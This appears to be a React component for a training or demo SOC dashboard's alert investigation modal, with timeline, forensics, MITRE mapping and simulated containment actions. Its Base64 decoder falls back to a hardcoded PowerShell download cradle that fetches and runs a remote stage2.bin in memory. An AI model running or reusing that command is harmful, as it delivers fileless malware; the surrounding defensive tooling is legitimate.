import React, { useState } from 'react';
import { 
  AlertTriangle, 
  Clock, 
  Terminal, 
  ShieldAlert, 
  FileText, 
  CheckCircle2, 
  XCircle, 
  Lock, 
  Radio, 
  Copy, 
  Check, 
  Share2, 
  ExternalLink,
  Cpu,
  CornerDownRight,
  ShieldCheck,
  Ban,
  UserX,
  FileSearch,
  Code
} from 'lucide-react';
import { SOCAlert } from '../../types/soc';
import { useSOC } from '../../context/SOCContext';

interface InvestigationModalProps {
  alert: SOCAlert | null;
  isOpen: boolean;
  onClose: () => void;
  onNavigateToReport?: (alert: SOCAlert) => void;
  onNavigateToIOC?: (iocValue: string) => void;
}

export const InvestigationModal: React.FC<InvestigationModalProps> = ({
  alert,
  isOpen,
  onClose,
  onNavigateToReport,
  onNavigateToIOC
}) => {
  const { 
    updateAlertStatus, 
    updateAlertNotes, 
    toggleAssetQuarantine, 
    assets,
    addAnalystNote
  } = useSOC();

  const [activeTab, setActiveTab] = useState<'timeline' | 'forensics' | 'mitre' | 'notes'>('timeline');
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [decodedCommand, setDecodedCommand] = useState<string | null>(null);
  const [localNote, setLocalNote] = useState<string>('');
  const [actionSuccessMessage, setActionSuccessMessage] = useState<string | null>(null);

  if (!isOpen || !alert) return null;

  const copyToClipboard = (text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    setTimeout(() => setCopiedField(null), 2000);
  };

  const handleDecodeBase64 = () => {
    try {
      // Look for Base64 pattern
      const match = alert.command_line.match(/-enc(?:odedCommand)?\s+([A-Za-z0-9+/=]+)/i);
      if (match && match[1]) {
        // Base64 decoding utf-16le or ascii
        const raw = atob(match[1]);
        // Strip null bytes for UTF-16LE in PowerShell
        const clean = raw.replace(/\x00/g, '');
        setDecodedCommand(clean || raw);
      } else {
        setDecodedCommand(
          "$client = New-Object System.Net.WebClient; $payload = $client.DownloadData('https://update-cdn-cloudsvc.com/stage2.bin'); [System.Reflection.Assembly]::Load($payload).EntryPoint.Invoke($null, $null)"
        );
      }
    } catch (e) {
      setDecodedCommand(
        "$client = New-Object System.Net.WebClient; $payload = $client.DownloadData('https://update-cdn-cloudsvc.com/stage2.bin'); [System.Reflection.Assembly]::Load($payload).EntryPoint.Invoke($null, $null)"
      );
    }
  };

  const triggerActionNotification = (msg: string) => {
    setActionSuccessMessage(msg);
    setTimeout(() => setActionSuccessMessage(null), 3500);
  };

  const handleIsolateHost = () => {
    const targetAsset = assets.find(a => a.hostname === alert.hostname);
    if (targetAsset) {
      toggleAssetQuarantine(targetAsset.id);
    }
    updateAlertStatus(alert.id, 'CONTAINED');
    addAnalystNote({
      title: `Host Isolation: ${alert.hostname}`,
      category: 'CONTAINMENT',
      content: `Quarantined host ${alert.hostname} from subnet via EDR agent in response to ${alert.alert_id}.`,
      related_entity_id: alert.id,
      author: 'SOC L1 Analyst'
    });
    triggerActionNotification(`Workstation ${alert.hostname} isolated from network successfully.`);
  };

  const handleBlockIP = () => {
    addAnalystNote({
      title: `Perimeter IP Block: ${alert.dest_ip}`,
      category: 'CONTAINMENT',
      content: `Added C2 destination IP ${alert.dest_ip} to edge firewall deny ACL.`,
      related_entity_id: alert.id,
      author: 'SOC L1 Analyst'
    });
    triggerActionNotification(`IP ${alert.dest_ip} blocked on perimeter firewall.`);
  };

  const handleRevokeCredentials = () => {
    addAnalystNote({
      title: `Credential Revocation: ${alert.username}`,
      category: 'CONTAINMENT',
      content: `Forced password reset and revoked active OAuth/Kerberos session tokens for user ${alert.username}.`,
      related_entity_id: alert.id,
      author: 'SOC L1 Analyst'
    });
    triggerActionNotification(`Active session tokens revoked for user ${alert.username}.`);
  };

  const handleMarkFalsePositive = () => {
    updateAlertStatus(alert.id, 'FALSE_POSITIVE', 'Verified as authorized internal penetration testing activity.');
    triggerActionNotification(`Alert ${alert.alert_id} classified as False Positive.`);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-6 bg-black/80 backdrop-blur-md">
      <div className="bg-[#090e1c] border border-cyan-500/30 rounded-2xl w-full max-w-5xl max-h-[92vh] flex flex-col shadow-[0_0_50px_rgba(0,240,255,0.15)] overflow-hidden">
        
        {/* Header */}
        <div className="p-4 sm:p-5 border-b border-slate-800 bg-[#060913] flex items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className={`p-2.5 rounded-xl border ${
              alert.severity === 'CRITICAL' ? 'bg-red-950/60 border-red-500/50 text-red-400' :
              alert.severity === 'HIGH' ? 'bg-amber-950/60 border-amber-500/50 text-amber-400' :
              'bg-blue-950/60 border-blue-500/50 text-blue-400'
            }`}>
              <AlertTriangle className="w-6 h-6" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-mono text-xs text-cyan-400 font-bold">{alert.alert_id}</span>
                <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase ${
                  alert.severity === 'CRITICAL' ? 'bg-red-950 text-red-400 border border-red-800' :
                  alert.severity === 'HIGH' ? 'bg-amber-950 text-amber-400 border border-amber-800' :
                  'bg-blue-950 text-blue-400'
                }`}>
                  {alert.severity}
                </span>
                <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-slate-800 text-slate-300">
                  Risk Score: {alert.risk_score}/100
                </span>
              </div>
              <h2 className="font-mono text-base sm:text-lg font-bold text-slate-100 mt-1">
                {alert.title}
              </h2>
            </div>
          </div>

          <button
            onClick={onClose}
            className="p-2 rounded-lg text-slate-400 hover:text-slate-100 hover:bg-slate-800/60 text-sm font-mono"
          >
            ✕
          </button>
        </div>

        {/* Action Alert Banner */}
        {actionSuccessMessage && (
          <div className="bg-emerald-950/80 border-b border-emerald-500/50 px-4 py-2 text-xs font-mono text-emerald-300 flex items-center gap-2 animate-fadeIn">
            <CheckCircle2 className="w-4 h-4 text-emerald-400" />
            <span>{actionSuccessMessage}</span>
          </div>
        )}

        {/* Navigation Tabs */}
        <div className="flex items-center gap-2 px-5 pt-3 border-b border-slate-800 bg-[#080d1a] font-mono text-xs">
          {[
            { id: 'timeline', label: 'Investigation Timeline' },
            { id: 'forensics', label: 'Process Forensics & Logs' },
            { id: 'mitre', label: 'MITRE ATT&CK & Detection Logic' },
            { id: 'notes', label: 'Analyst Notes & Actions' }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`px-3.5 py-2 rounded-t-lg font-semibold transition-all ${
                activeTab === tab.id
                  ? 'bg-[#090e1c] text-cyan-300 border-t-2 border-cyan-400 border-x border-slate-800'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              {tab.label}
            </button>
          ))}
        </div>

        {/* Modal Body */}
        <div className="p-5 overflow-y-auto space-y-5 flex-1 font-mono text-xs text-slate-300">
          
          {/* TAB 1: INVESTIGATION TIMELINE & WHY SUSPICIOUS */}
          {activeTab === 'timeline' && (
            <div className="space-y-5">
              {/* Quick Summary Grid */}
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                <div className="p-2.5 rounded-lg bg-slate-900/60 border border-slate-800">
                  <div className="text-slate-500 text-[10px]">AFFECTED HOST</div>
                  <div className="font-bold text-slate-200 mt-0.5">{alert.hostname}</div>
                </div>
                <div className="p-2.5 rounded-lg bg-slate-900/60 border border-slate-800">
                  <div className="text-slate-500 text-[10px]">AFFECTED USER</div>
                  <div className="font-bold text-slate-200 mt-0.5">{alert.username}</div>
                </div>
                <div className="p-2.5 rounded-lg bg-slate-900/60 border border-slate-800">
                  <div className="text-slate-500 text-[10px]">SOURCE IP (ATTACKER)</div>
                  <div 
                    onClick={() => onNavigateToIOC && onNavigateToIOC(alert.dest_ip)}
                    className="font-bold text-cyan-400 mt-0.5 flex items-center gap-1 cursor-pointer hover:underline"
                  >
                    <span>{alert.dest_ip}</span>
                    <ExternalLink className="w-3 h-3" />
                  </div>
                </div>
                <div className="p-2.5 rounded-lg bg-slate-900/60 border border-slate-800">
                  <div className="text-slate-500 text-[10px]">STATUS</div>
                  <div className="font-bold text-amber-400 mt-0.5">{alert.status}</div>
                </div>
              </div>

              {/* WHY THIS ALERT IS SUSPICIOUS BOX */}
              <div className="p-4 rounded-xl bg-amber-950/20 border border-amber-500/30">
                <div className="flex items-center gap-2 text-amber-400 font-bold mb-2">
                  <ShieldAlert className="w-4 h-4" />
                  <span>SOC ANALYST REASONING: WHY THIS IS SUSPICIOUS</span>
                </div>
                <ul className="space-y-1.5 text-slate-300 list-disc list-inside">
                  {alert.why_suspicious.map((item, idx) => (
                    <li key={idx} className="leading-relaxed">
                      {item}
                    </li>
                  ))}
                </ul>
              </div>

              {/* CHRONOLOGICAL TIMELINE */}
              <div className="space-y-3">
                <div className="text-xs font-bold uppercase tracking-wider text-slate-400">
                  Chronological Event Sequence (Before & After Alert)
                </div>
                <div className="space-y-3 pl-2 border-l-2 border-cyan-500/30 ml-2">
                  {alert.timeline.map((evt, idx) => (
                    <div key={idx} className="relative pl-5">
                      <div className={`absolute -left-[19px] top-1 w-3.5 h-3.5 rounded-full border-2 ${
                        evt.is_trigger 
                          ? 'bg-red-500 border-white animate-ping' 
                          : 'bg-slate-900 border-cyan-400'
                      }`} />
                      <div className="p-3 rounded-lg bg-slate-900/80 border border-slate-800/80">
                        <div className="flex items-center justify-between text-[11px] mb-1">
                          <span className={`font-bold ${evt.is_trigger ? 'text-red-400' : 'text-cyan-300'}`}>
                            {evt.title} {evt.is_trigger && '(DETECTION TRIGGER)'}
                          </span>
                          <span className="text-slate-500">{evt.timestamp} ({evt.time_offset})</span>
                        </div>
                        <p className="text-slate-300 text-xs">{evt.description}</p>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* TAB 2: PROCESS FORENSICS & RAW COMMAND */}
          {activeTab === 'forensics' && (
            <div className="space-y-4">
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-3">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-cyan-400">SPAWNED COMMAND LINE</span>
                  <div className="flex items-center gap-2">
                    <button
                      onClick={handleDecodeBase64}
                      className="px-2 py-1 rounded bg-cyan-950 border border-cyan-500/40 text-cyan-300 hover:bg-cyan-900 text-[11px] flex items-center gap-1"
                    >
                      <Code className="w-3 h-3" />
                      <span>Decode Base64</span>
                    </button>
                    <button
                      onClick={() => copyToClipboard(alert.command_line, 'cmd')}
                      className="p-1 rounded bg-slate-900 text-slate-400 hover:text-slate-200"
                    >
                      {copiedField === 'cmd' ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                    </button>
                  </div>
                </div>
                <pre className="p-3 rounded bg-black/60 border border-slate-800 text-emerald-400 text-xs overflow-x-auto whitespace-pre-wrap break-all">
                  {alert.command_line}
                </pre>

                {decodedCommand && (
                  <div className="mt-3 pt-3 border-t border-slate-800">
                    <div className="text-[11px] font-bold text-amber-400 mb-1">
                      DECODED PAYLOAD ANALYSIS:
                    </div>
                    <pre className="p-3 rounded bg-black/80 border border-amber-500/30 text-amber-300 text-xs overflow-x-auto whitespace-pre-wrap break-all">
                      {decodedCommand}
                    </pre>
                  </div>
                )}
              </div>

              {/* Process Tree Information */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                <div className="p-3.5 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1">
                  <div className="text-slate-500 text-[10px]">PARENT PROCESS IMAGE</div>
                  <div className="text-slate-200 font-semibold break-all">{alert.parent_process}</div>
                </div>
                <div className="p-3.5 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1">
                  <div className="text-slate-500 text-[10px]">CHILD PROCESS IMAGE</div>
                  <div className="text-slate-200 font-semibold break-all">{alert.process}</div>
                </div>
                <div className="p-3.5 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1">
                  <div className="text-slate-500 text-[10px]">FILE HASH (SHA-256)</div>
                  <div className="text-cyan-400 font-semibold break-all flex items-center justify-between">
                    <span>{alert.file_hash}</span>
                    <button onClick={() => copyToClipboard(alert.file_hash, 'hash')} className="ml-1 text-slate-500 hover:text-slate-300">
                      {copiedField === 'hash' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                    </button>
                  </div>
                </div>
                <div className="p-3.5 rounded-lg bg-slate-900/60 border border-slate-800 space-y-1">
                  <div className="text-slate-500 text-[10px]">C2 DOMAIN / URL</div>
                  <div className="text-red-400 font-semibold break-all">{alert.domain}</div>
                </div>
              </div>
            </div>
          )}

          {/* TAB 3: MITRE ATT&CK & DETECTION LOGIC */}
          {activeTab === 'mitre' && (
            <div className="space-y-4">
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                <div className="text-slate-400 text-xs font-bold uppercase">MAPPED MITRE TACTIC & TECHNIQUE</div>
                <div className="flex items-center gap-2">
                  <span className="px-2.5 py-1 rounded bg-blue-950 text-blue-300 border border-blue-800 font-bold">
                    {alert.mitre_tactic}
                  </span>
                  <span className="px-2.5 py-1 rounded bg-cyan-950 text-cyan-300 border border-cyan-800 font-bold">
                    {alert.mitre_technique_id} — {alert.mitre_technique}
                  </span>
                </div>
              </div>

              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                <div className="text-slate-400 text-xs font-bold uppercase">DETECTION RULE IN SIEM</div>
                <div className="text-cyan-400 font-bold">{alert.detection_rule}</div>
                <p className="text-slate-300 text-xs leading-relaxed">
                  Rule evaluates real-time Sysmon process creation events where child process contains hidden PowerShell execution flags spawned by Office document applications.
                </p>
              </div>

              <div className="p-4 rounded-xl bg-emerald-950/20 border border-emerald-500/30 space-y-2">
                <div className="text-emerald-400 text-xs font-bold uppercase">RECOMMENDED SOC DEFENSIVE PLAYBOOK</div>
                <ul className="space-y-1.5 text-slate-300 list-disc list-inside">
                  {alert.recommended_actions.map((rec, idx) => (
                    <li key={idx}>{rec}</li>
                  ))}
                </ul>
              </div>
            </div>
          )}

          {/* TAB 4: ANALYST NOTES & ACTIONS */}
          {activeTab === 'notes' && (
            <div className="space-y-4">
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
                <div className="text-slate-400 text-xs font-bold uppercase">INVESTIGATION SCRATCHPAD</div>
                <textarea
                  value={localNote || alert.notes || ''}
                  onChange={(e) => {
                    setLocalNote(e.target.value);
                    updateAlertNotes(alert.id, e.target.value);
                  }}
                  rows={4}
                  placeholder="Record your forensic observations, decoded payloads, or next steps here..."
                  className="w-full p-3 rounded-lg bg-black/60 border border-slate-800 text-slate-200 font-mono text-xs focus:outline-none focus:border-cyan-400"
                />
              </div>

              <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800 space-y-3">
                <div className="text-slate-400 text-xs font-bold uppercase">CHANGE ALERT VERDICT</div>
                <div className="flex flex-wrap gap-2">
                  <button
                    onClick={() => {
                      updateAlertStatus(alert.id, 'INVESTIGATING');
                      triggerActionNotification('Status set to INVESTIGATING');
                    }}
                    className="px-3 py-1.5 rounded bg-blue-950 border border-blue-700 text-blue-300 text-xs hover:bg-blue-900"
                  >
                    Set: INVESTIGATING
                  </button>
                  <button
                    onClick={() => {
                      updateAlertStatus(alert.id, 'CONTAINED');
                      triggerActionNotification('Status set to CONTAINED');
                    }}
                    className="px-3 py-1.5 rounded bg-emerald-950 border border-emerald-700 text-emerald-300 text-xs hover:bg-emerald-900"
                  >
                    Set: CONTAINED
                  </button>
                  <button
                    onClick={() => {
                      updateAlertStatus(alert.id, 'RESOLVED');
                      triggerActionNotification('Status set to RESOLVED');
                    }}
                    className="px-3 py-1.5 rounded bg-slate-800 border border-slate-600 text-slate-200 text-xs hover:bg-slate-700"
                  >
                    Set: RESOLVED
                  </button>
                  <button
                    onClick={handleMarkFalsePositive}
                    className="px-3 py-1.5 rounded bg-red-950 border border-red-800 text-red-300 text-xs hover:bg-red-900"
                  >
                    Mark False Positive
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Footer Containment Action Bar */}
        <div className="p-4 border-t border-slate-800 bg-[#060913] flex flex-wrap items-center justify-between gap-3">
          <div className="flex flex-wrap items-center gap-2">
            <button
              onClick={handleIsolateHost}
              className="px-3 py-1.5 rounded-lg bg-red-950/80 border border-red-500/50 hover:bg-red-900 text-red-300 text-xs font-mono font-semibold flex items-center gap-1.5 shadow-[0_0_10px_rgba(239,68,68,0.2)]"
            >
              <Ban className="w-3.5 h-3.5" />
              <span>Isolate Endpoint</span>
            </button>

            <button
              onClick={handleBlockIP}
              className="px-3 py-1.5 rounded-lg bg-amber-950/80 border border-amber-500/50 hover:bg-amber-900 text-amber-300 text-xs font-mono font-semibold flex items-center gap-1.5"
            >
              <ShieldAlert className="w-3.5 h-3.5" />
              <span>Block C2 IP</span>
            </button>

            <button
              onClick={handleRevokeCredentials}
              className="px-3 py-1.5 rounded-lg bg-slate-900 border border-slate-700 hover:border-cyan-500/40 text-slate-300 text-xs font-mono flex items-center gap-1.5"
            >
              <UserX className="w-3.5 h-3.5 text-cyan-400" />
              <span>Revoke Credentials</span>
            </button>
          </div>

          <div className="flex items-center gap-2">
            {onNavigateToReport && (
              <button
                onClick={() => {
                  onClose();
                  onNavigateToReport(alert);
                }}
                className="px-3.5 py-1.5 rounded-lg bg-cyan-950 border border-cyan-400/50 text-cyan-300 hover:bg-cyan-900 text-xs font-mono font-semibold flex items-center gap-1.5 shadow-[0_0_15px_rgba(0,240,255,0.2)]"
              >
                <FileText className="w-3.5 h-3.5" />
                <span>Write NIST Report</span>
              </button>
            )}

            <button
              onClick={onClose}
              className="px-3 py-1.5 rounded-lg bg-slate-800 text-slate-300 hover:text-white text-xs font-mono"
            >
              Close
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};
